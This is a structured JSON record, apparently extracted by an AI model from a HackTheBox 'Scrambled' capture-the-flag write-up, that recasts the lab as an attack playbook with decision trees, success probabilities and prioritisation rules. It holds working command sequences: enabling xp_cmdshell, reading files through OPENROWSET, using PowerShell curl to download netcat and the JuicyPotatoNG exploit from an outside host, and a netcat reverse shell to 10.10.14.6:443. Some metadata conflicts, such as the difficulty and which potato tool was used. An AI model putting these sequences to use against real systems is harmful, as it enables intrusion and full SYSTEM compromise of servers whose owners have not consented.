{
  "writeup_id": "Htb_Scrambled_Beyond_Root",
  "scenario_fingerprint": {
    "scenario_name": "windows_mssql_privilege_escalation",
    "primary_services": [
      "mssql",
      "smb",
      "ldap",
      "kerberos"
    ],
    "port_signature": "1433+445+389+88",
    "service_combination": "mssql+active_directory",
    "os_family": "windows_server",
    "environment_type": "active_directory",
    "entry_vector": "mssql_database_access",
    "privilege_path": "mssql_service_to_system",
    "attack_complexity": "easy",
    "estimated_time": "30-45 minutes",
    "scenario_confidence": 0.92,
    "distinguishing_factors": [
      "mssql_xp_cmdshell_configurable",
      "sqlsvc_seimpersonate_privilege",
      "openrowset_bulk_file_read"
    ],
    "environmental_clues": [
      "mssql_service_account",
      "seimpersonate_privilege_available",
      "xp_cmdshell_disabled_by_default"
    ],
    "similar_scenarios": [
      "archetype_htb_starting_point",
      "querier_htb_medium"
    ],
    "unique_aspects": [
      "openrowset_bulk_provider_abuse",
      "juicypotatong_exploitation",
      "mssql_file_read_capability"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "MSSQL_BULK_File_Read",
        "success_reason": "MSSQL service had OPENROWSET BULK permissions enabled",
        "prerequisite_indicators": [
          "mssql_service_accessible",
          "authenticated_database_access",
          "bulk_operations_permitted"
        ],
        "recognition_patterns": [
          "MSSQL service running",
          "database credentials available",
          "OPENROWSET function accessible"
        ],
        "failure_modes": [
          "bulk_operations_disabled",
          "insufficient_database_permissions",
          "file_system_access_restricted"
        ],
        "environmental_factors": [
          "default_mssql_configuration",
          "service_running_with_elevated_privileges",
          "insufficient_database_hardening"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "2-5 minutes"
      },
      {
        "technique": "MSSQL_xp_cmdshell_RCE",
        "success_reason": "MSSQL allowed sp_configure modifications and xp_cmdshell enablement",
        "prerequisite_indicators": [
          "mssql_admin_privileges",
          "sp_configure_accessible",
          "xp_cmdshell_configurable"
        ],
        "recognition_patterns": [
          "sysadmin role membership",
          "advanced options configurable",
          "stored procedures accessible"
        ],
        "failure_modes": [
          "insufficient_mssql_privileges",
          "xp_cmdshell_permanently_disabled",
          "policy_restrictions_enforced"
        ],
        "environmental_factors": [
          "default_mssql_security_settings",
          "legacy_database_configurations",
          "service_account_over_privileged"
        ],
        "success_probability": 0.85,
        "typical_timeframe": "3-10 minutes"
      },
      {
        "technique": "JuicyPotatoNG_Privilege_Escalation",
        "success_reason": "MSSQL service account had SeImpersonatePrivilege",
        "prerequisite_indicators": [
          "seimpersonate_privilege_present",
          "service_account_context",
          "com_objects_accessible"
        ],
        "recognition_patterns": [
          "whoami /priv shows SeImpersonatePrivilege",
          "service account execution context",
          "Windows Server environment"
        ],
        "failure_modes": [
          "seimpersonate_privilege_removed",
          "com_hardening_implemented",
          "potato_mitigations_active"
        ],
        "environmental_factors": [
          "windows_server_default_privileges",
          "service_account_configuration",
          "insufficient_privilege_hardening"
        ],
        "success_probability": 0.9,
        "typical_timeframe": "5-15 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "MSSQL service with admin privileges",
        "discovery_method": "Database connection enumeration",
        "why_critical": "Enabled both file read and command execution paths to SYSTEM",
        "how_to_recognize": [
          "database service accessible",
          "sysadmin role membership",
          "sp_configure permissions available"
        ],
        "follow_up_actions": [
          "test_openrowset_bulk_access",
          "attempt_xp_cmdshell_enablement",
          "check_service_account_privileges"
        ]
      },
      {
        "discovery": "SeImpersonatePrivilege on service account",
        "discovery_method": "whoami /priv enumeration via xp_cmdshell",
        "why_critical": "Direct path to SYSTEM via token impersonation",
        "how_to_recognize": [
          "service account context",
          "SeImpersonatePrivilege enabled",
          "Windows Server environment"
        ],
        "follow_up_actions": [
          "deploy_juicypotato_variant",
          "setup_reverse_shell_payload",
          "execute_privilege_escalation"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "database_user",
        "escalation_method": "MSSQL_Configuration_Abuse",
        "why_possible": "Database user had sysadmin privileges allowing sp_configure modifications",
        "recognition_signs": [
          "sysadmin_role_membership",
          "sp_configure_accessible",
          "advanced_options_configurable"
        ],
        "exploitation_path": "sp_configure → xp_cmdshell → RCE as service account"
      },
      {
        "privilege_level": "service_account",
        "escalation_method": "Token_Impersonation_Attack",
        "why_possible": "Service account inherited SeImpersonatePrivilege from service context",
        "recognition_signs": [
          "seimpersonate_privilege_enabled",
          "service_account_execution_context",
          "com_objects_available"
        ],
        "exploitation_path": "SeImpersonatePrivilege → JuicyPotatoNG → SYSTEM shell"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "MSSQL service access obtained with domain credentials",
        "decision": "Check for xp_cmdshell availability and SeImpersonatePrivilege",
        "reasoning": "MSSQL services often run with elevated privileges and impersonation rights",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "file_read_via_openrowset",
            "when": "if command execution blocked"
          },
          {
            "option": "linked_server_enumeration",
            "when": "if current server restricted"
          }
        ],
        "success_indicators": [
          "xp_cmdshell_configurable",
          "seimpersonateprivilege_present",
          "command_execution_achieved"
        ],
        "next_decision": "choose_privilege_escalation_method"
      },
      {
        "step": 2,
        "situation": "xp_cmdshell blocked by security configuration",
        "decision": "Enable xp_cmdshell via sp_configure if permissions allow",
        "reasoning": "Standard MSSQL hardening can often be reversed with proper privileges",
        "confidence": 0.85,
        "prerequisites": [
          "sysadmin_or_serveradmin_role"
        ],
        "success_indicators": [
          "xp_cmdshell_enabled_successfully"
        ],
        "failure_fallbacks": [
          "openrowset_file_read",
          "linked_server_attacks"
        ]
      },
      {
        "step": 3,
        "situation": "Command execution achieved with SeImpersonatePrivilege",
        "decision": "Deploy JuicyPotatoNG for SYSTEM escalation",
        "reasoning": "Latest potato exploit with high success rate on modern Windows",
        "confidence": 0.95,
        "prerequisites": [
          "seimpersonateprivilege_confirmed",
          "file_upload_capability"
        ],
        "success_indicators": [
          "system_shell_obtained"
        ],
        "failure_fallbacks": [
          "roguepotato",
          "printspoofer",
          "godpotato"
        ]
      }
    ],
    "branching_logic": {
      "if_xp_cmdshell_blocked": {
        "action": "attempt_configuration_change",
        "commands": [
          "EXECUTE sp_configure 'show advanced options', 1",
          "RECONFIGURE",
          "EXECUTE sp_configure 'xp_cmdshell', 1",
          "RECONFIGURE"
        ],
        "fallback": "use_openrowset_for_file_access"
      },
      "if_seimpersonate_present": {
        "action": "deploy_potato_exploit",
        "preferred_tool": "juicypotatong",
        "staging_location": "c:\\programdata\\",
        "required_files": [
          "juicypotatong.exe",
          "nc64.exe",
          "reverse_shell_script"
        ]
      },
      "if_file_read_only": {
        "action": "use_openrowset_bulk",
        "syntax": "SELECT BulkColumn FROM OPENROWSET(BULK 'filepath', SINGLE_CLOB) MyFile",
        "purpose": "extract_sensitive_files_without_shell"
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_mssql_for_privilege_escalation",
        "reasoning": "mssql_services_commonly_have_seimpersonate_privilege",
        "applicability": "any_mssql_access_obtained"
      },
      {
        "rule": "try_juicypotatong_first_on_modern_windows",
        "reasoning": "latest_potato_with_highest_success_rate",
        "applicability": "windows_10_server_2016_and_newer"
      },
      {
        "rule": "use_openrowset_for_stealth_file_access",
        "reasoning": "avoids_command_execution_logging",
        "applicability": "when_stealth_required_or_xp_cmdshell_unavailable"
      },
      {
        "rule": "stage_files_in_programdata_for_potato_exploits",
        "reasoning": "commonly_writable_location_with_execution_permissions",
        "applicability": "potato_exploit_deployment"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "MSSQL File Read via OPENROWSET BULK",
        "mitre_id": "T1005",
        "required_services": [
          "mssql"
        ],
        "required_ports": [
          1433,
          1434
        ],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "mssql_server_2005_or_later",
          "database_access_credentials",
          "openrowset_enabled"
        ],
        "success_indicators": [
          "bulk_provider_available",
          "file_system_access_from_sql_context",
          "single_clob_returns_data"
        ],
        "incompatible_with": [
          "openrowset_disabled",
          "insufficient_sql_permissions",
          "file_access_restrictions"
        ],
        "confidence_boosters": [
          "sql_server_version_2005_plus",
          "elevated_sql_service_account",
          "default_bulk_provider_config"
        ],
        "typical_success_rate": 0.85,
        "estimated_time": "2-5 minutes"
      },
      {
        "technique": "MSSQL Command Execution via xp_cmdshell",
        "mitre_id": "T1059.003",
        "required_services": [
          "mssql"
        ],
        "required_ports": [
          1433,
          1434
        ],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "mssql_database_access",
          "sp_configure_permissions",
          "xp_cmdshell_configurable"
        ],
        "success_indicators": [
          "show_advanced_options_enabled",
          "xp_cmdshell_reconfigured",
          "command_execution_successful"
        ],
        "incompatible_with": [
          "xp_cmdshell_permanently_disabled",
          "insufficient_reconfigure_permissions",
          "policy_restrictions"
        ],
        "confidence_boosters": [
          "sysadmin_role_membership",
          "default_mssql_configuration",
          "service_account_privileges"
        ],
        "typical_success_rate": 0.9,
        "estimated_time": "3-8 minutes"
      },
      {
        "technique": "JuicyPotatoNG Privilege Escalation",
        "mitre_id": "T1134.001",
        "required_services": [
          "any_service_with_seimpersonate"
        ],
        "required_ports": [],
        "os_requirements": [
          "windows"
        ],
        "environmental_prerequisites": [
          "seimpersonate_privilege",
          "com_services_available",
          "file_upload_capability"
        ],
        "success_indicators": [
          "clsid_testing_successful",
          "authresult_success",
          "createprocesswithtokenw_ok"
        ],
        "incompatible_with": [
          "com_services_disabled",
          "seimpersonate_removed",
          "process_isolation_enforced"
        ],
        "confidence_boosters": [
          "mssql_service_context",
          "default_com_configuration",
          "writable_staging_directory"
        ],
        "typical_success_rate": 0.92,
        "estimated_time": "5-10 minutes"
      }
    ],
    "environmental_detectors": {
      "mssql_server": {
        "port_indicators": [
          1433,
          1434
        ],
        "service_indicators": [
          "mssql",
          "ms-sql-s",
          "ms-sql-m"
        ],
        "banner_indicators": [
          "Microsoft SQL Server",
          "MSSQLSERVER"
        ],
        "confidence_threshold": 0.9
      },
      "windows_domain": {
        "port_indicators": [
          53,
          88,
          389,
          445,
          3268
        ],
        "service_indicators": [
          "kerberos",
          "ldap",
          "smb",
          "dns"
        ],
        "banner_indicators": [
          "Active Directory",
          "Windows Server"
        ],
        "confidence_threshold": 0.85
      },
      "privileged_service_context": {
        "port_indicators": [],
        "service_indicators": [
          "mssql",
          "iis",
          "exchange"
        ],
        "privilege_indicators": [
          "SeImpersonatePrivilege",
          "SeAssignPrimaryTokenPrivilege"
        ],
        "confidence_threshold": 0.8
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "mssql_xp_cmdshell_enable",
          "when": "mssql_access_obtained",
          "reason": "reliable_command_execution_path"
        },
        {
          "attack": "juicypotato_variants",
          "when": "seimpersonate_privilege_detected",
          "reason": "high_success_rate_system_escalation"
        }
      ],
      "medium_priority": [
        {
          "attack": "mssql_file_read_bulk",
          "when": "mssql_access_without_xp_cmdshell",
          "reason": "alternative_data_exfiltration_method"
        },
        {
          "attack": "mssql_configuration_enumeration",
          "when": "mssql_service_detected",
          "reason": "reveals_attack_surface_and_permissions"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "MSSQL File Read via OPENROWSET",
        "mitre_id": "T1005",
        "category": "collection",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "MSSQL OPENROWSET",
            "command_template": "SELECT BulkColumn FROM OPENROWSET(BULK '{file_path}', SINGLE_CLOB) MyFile",
            "actual_command": "SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\users\\administrator\\desktop\\root.txt', SINGLE_CLOB) MyFile",
            "output_pattern": "BulkColumn with file contents",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "mssql_access",
          "bulk_operations_enabled",
          "file_system_access"
        ],
        "success_indicators": [
          "file_contents_returned",
          "no_access_denied_errors"
        ],
        "common_failures": [
          "insufficient_privileges",
          "file_not_found",
          "bulk_operations_disabled"
        ],
        "follow_up_techniques": [
          "credential_extraction",
          "configuration_file_analysis"
        ],
        "time_investment": "1-5 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "MSSQL Command Execution via xp_cmdshell",
        "mitre_id": "T1059.003",
        "category": "execution",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "xp_cmdshell",
            "command_template": "xp_cmdshell '{command}'",
            "actual_command": "xp_cmdshell whoami",
            "output_pattern": "Command output in SQL result set",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "mssql_sysadmin_access",
          "xp_cmdshell_enabled_or_configurable"
        ],
        "success_indicators": [
          "command_output_returned",
          "system_level_access_achieved"
        ],
        "common_failures": [
          "xp_cmdshell_disabled",
          "insufficient_sql_privileges",
          "command_execution_blocked"
        ],
        "follow_up_techniques": [
          "privilege_escalation_via_potato",
          "persistence_establishment"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "JuicyPotatoNG Privilege Escalation",
        "mitre_id": "T1134.001",
        "category": "privilege_escalation",
        "phase": "privilege_escalation",
        "tools_used": [
          {
            "name": "JuicyPotatoNG",
            "command_template": "JuicyPotatoNG.exe -t * -p {payload_path}",
            "actual_command": "C:\\programdata\\jp.exe -t * -p C:\\programdata\\rev.bat",
            "output_pattern": "Exploit successful! with SYSTEM token",
            "effectiveness_rating": 5,
            "reliability": 0.85
          },
          {
            "name": "netcat",
            "command_template": "nc64.exe -e cmd {ip} {port}",
            "actual_command": "C:\\programdata\\nc64.exe -e cmd 10.10.14.6 443",
            "success_factors": [
              "network_connectivity",
              "listener_ready"
            ],
            "effectiveness_rating": 5
          }
        ],
        "prerequisites": [
          "seimpersonate_privilege",
          "file_upload_capability",
          "network_connectivity"
        ],
        "success_indicators": [
          "system_shell_obtained",
          "nt_authority_system_privileges",
          "exploit_successful_message"
        ],
        "common_failures": [
          "missing_seimpersonate_privilege",
          "network_restrictions",
          "antivirus_detection"
        ],
        "follow_up_techniques": [
          "credential_dumping",
          "persistence_establishment",
          "lateral_movement"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "MSSQL OPENROWSET",
        "use_case": "arbitrary_file_read",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "mssql_environments"
        ],
        "alternatives": [
          "xp_dirtree",
          "xp_fileexist"
        ],
        "best_practices": [
          "use_single_clob_for_text_files",
          "check_file_permissions_first",
          "validate_file_paths"
        ]
      },
      {
        "tool": "JuicyPotatoNG",
        "use_case": "privilege_escalation_from_service_account",
        "effectiveness_rating": 5,
        "reliability": 0.85,
        "learning_curve": "medium",
        "essential_for": [
          "windows_service_exploitation"
        ],
        "alternatives": [
          "RoguePotato",
          "PrintSpoofer",
          "GodPotato"
        ],
        "best_practices": [
          "verify_seimpersonate_privilege_first",
          "stage_files_in_writable_directory",
          "use_batch_file_for_complex_payloads"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "mssql_xp_cmdshell_enablement",
        "steps": [
          {
            "step": 1,
            "command": "EXECUTE sp_configure 'show advanced options', 1",
            "purpose": "Enable advanced configuration options",
            "expected_output": "Configuration option changed message"
          },
          {
            "step": 2,
            "command": "RECONFIGURE",
            "purpose": "Apply configuration changes",
            "expected_output": "Command completed successfully"
          },
          {
            "step": 3,
            "command": "EXECUTE sp_configure 'xp_cmdshell', 1",
            "purpose": "Enable xp_cmdshell functionality",
            "expected_output": "Configuration option changed message"
          },
          {
            "step": 4,
            "command": "RECONFIGURE",
            "purpose": "Apply xp_cmdshell configuration",
            "expected_output": "Command completed successfully"
          }
        ],
        "success_rate": 0.95,
        "typical_duration": "2-5 minutes"
      },
      {
        "sequence_name": "juicypotato_privilege_escalation",
        "steps": [
          {
            "step": 1,
            "command": "xp_cmdshell powershell curl 10.10.14.6/nc64.exe -outfile C:\\programdata\\nc64.exe",
            "purpose": "Upload netcat binary",
            "expected_output": "File downloaded successfully"
          },
          {
            "step": 2,
            "command": "xp_cmdshell powershell curl 10.10.14.6/rev.bat -outfile C:\\programdata\\rev.bat",
            "purpose": "Upload reverse shell batch file",
            "expected_output": "File downloaded successfully"
          },
          {
            "step": 3,
            "command": "xp_cmdshell powershell curl 10.10.14.6/JuicyPotatoNG.exe -outfile C:\\programdata\\jp.exe",
            "purpose": "Upload JuicyPotatoNG exploit",
            "expected_output": "File downloaded successfully"
          },
          {
            "step": 4,
            "command": "xp_cmdshell C:\\programdata\\jp.exe -t * -p C:\\programdata\\rev.bat",
            "purpose": "Execute privilege escalation exploit",
            "expected_output": "Exploit successful! and SYSTEM shell"
          }
        ],
        "success_rate": 0.8,
        "typical_duration": "10-15 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Scrambled",
      "difficulty": "Medium",
      "os": "Windows Server",
      "platform": "HackTheBox",
      "release_date": "Unknown",
      "author": "Unknown",
      "estimated_time": "2-4 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "mssql",
        "kerberos",
        "active_directory"
      ],
      "key_vulnerabilities": [
        "mssql_misconfiguration",
        "service_account_abuse",
        "file_read_via_sql"
      ],
      "environment_type": "corporate_domain_controller",
      "real_world_relevance": "high",
      "learning_value": [
        "mssql_exploitation",
        "openrowset_abuse",
        "xp_cmdshell",
        "roguepotato"
      ],
      "prerequisite_knowledge": [
        "sql_server_administration",
        "windows_privileges",
        "kerberos_attacks"
      ]
    },
    "categorization": {
      "primary_category": "active_directory",
      "subcategories": [
        "database_exploitation",
        "privilege_escalation",
        "service_account_abuse"
      ],
      "attack_types": [
        "credential_access",
        "privilege_escalation",
        "lateral_movement"
      ],
      "defensive_lessons": [
        "disable_xp_cmdshell",
        "restrict_openrowset",
        "service_account_hardening",
        "sql_server_security"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Querier",
        "Archetype",
        "Sequel"
      ],
      "similarity_reasons": [
        "mssql_exploitation",
        "xp_cmdshell_abuse",
        "service_account_compromise"
      ],
      "unique_aspects": [
        "openrowset_file_read",
        "roguepotato_escalation",
        "bulk_provider_abuse"
      ],
      "difficulty_factors": [
        "multiple_attack_paths",
        "sql_server_configuration",
        "windows_token_impersonation"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T16:50:42.974763",
    "original_file": "0xdf_writeups/Htb Scrambled Beyond Root.md",
    "content_length": 6301,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}